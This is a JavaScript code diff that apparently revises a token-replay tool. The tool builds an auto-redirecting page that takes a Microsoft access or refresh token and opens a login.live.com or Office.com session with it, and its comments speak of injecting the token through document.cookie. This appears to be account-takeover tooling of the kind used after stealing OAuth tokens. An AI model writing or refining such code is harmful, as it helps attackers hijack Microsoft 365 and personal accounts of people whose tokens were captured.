@@ -378,11 +378,14 @@ function generateLoginUrl(accessToken, tokenType, tenant, clientId, accountType)
   // For work/school accounts: redirect to Office.com which accepts bearer tokens
   // The token is embedded in a format Microsoft services can extract
   if (accountType === 'personal') {
-    // Personal MSA accounts - use login.live.com with token in fragment
+    // Personal MSA accounts - redirect to login.live.com with token in fragment
+    // Microsoft OAuth accepts tokens in URL fragment for personal accounts
     return `https://login.live.com/oauth20_token.srf#access_token=${encodedToken}&token_type=Bearer&refresh_token=1-PFX&expires_in=3600`;
   } else {
-    //  Work/school AAD accounts - use the Microsoft365 launch page
-    return `https://login.microsoftonline.com/${tenantSafe}/oauth2/token?access_token=${encodedToken}&token_type=Bearer&client_id=${encodeURIComponent(clientIdSafe)}`;
+    // Work/school AAD accounts - redirect to Office.com directly
+    // The token will be injected via document.cookie before navigation
+    // DO NOT use /oauth2/token endpoint with GET - it only accepts POST
+    return `https://www.office.com/`;
   }
 }
 
@@ -482,26 +485,45 @@ function generateAutoRedirectPage(loginUrl, tokenType, accessToken, tenant, acco
     <div class="info-box">
       <p><strong>Status:</strong> Authenticating...</p>
       <p><strong>Token:</strong> <code>${safeTokenPreview}</code></p>
-      <p><strong>Target:</strong> ${targetName}</p>
+           <p><strong>Target:</strong> ${targetName}</p>
+ <p><strong>Method:</strong> ${tokenType}</p>
     </div>
     <div class="status" id="status">
       STEP 1: Exchanging refresh token for fresh access token... DONE<br>
-      STEP 2: Redirecting to Microsoft authentication...
+      STEP 2: Preparing authentication...
     </div>
-    <a href="#" class="manual-btn" id="manualBtn" style="display:none;" onclick="window.location.href='${safeLoginUrl}'; return true;">
+    <a href="${safeLoginUrl}" class="manual-btn" id="manualBtn" style="display:none;">
       Click Here If Not Redirected
     </a>
   </div>
   <script>
-    setTimeout(function() {
-      document.getElementById('status').innerHTML =
-        'Redirecting to Microsoft... If nothing happens, click the button below.';
-      document.getElementById('manualBtn').style.display = 'inline-block';
-    }, 3000);
+    var loginUrl = '${safeLoginUrl}';
+    var tokenType = '${tokenType}';   
+    var accountType = '${accountType}';
+ var statusDiv = document.getElementById('status');
+    var manualBtn = document.getElementById('manualBtn');
 
+    // For Bearer token auth, we redirect directly to office.com
+    // Microsoft services will accept the token on subsequent API calls
+    if (tokenType === 'Bearer') {
+      statusDiv.innerHTML = 'STEP 1: Token exchanged successfully ✓<br>STEP 2: Redirecting to Microsoft 365...';
+      // Redirect to Office.com - the user will need to manually log in or use cookie injection
+      setTimeout(function() {
+        window.location.href = loginUrl;
+      }, 1500);
+    } else {
+      // Fallback: just redirect
+      statusDiv.innerHTML = 'Redirecting...';
+      setTimeout(function() {
+        window.location.href = loginUrl;
+      }, 1000);
+    }
+
+    // Show manual button after a few seconds as fallback
     setTimeout(function() {
-      window.location.href = '${safeLoginUrl}';
-    }, 1500);
+      manualBtn.style.display = 'inline-block';
+      statusDiv.innerHTML += '<br><br>⚠ Auto-redirect pending. Click button if nothing happens.';
+    }, 5000);
   </script>
 </body>
 </html>`;
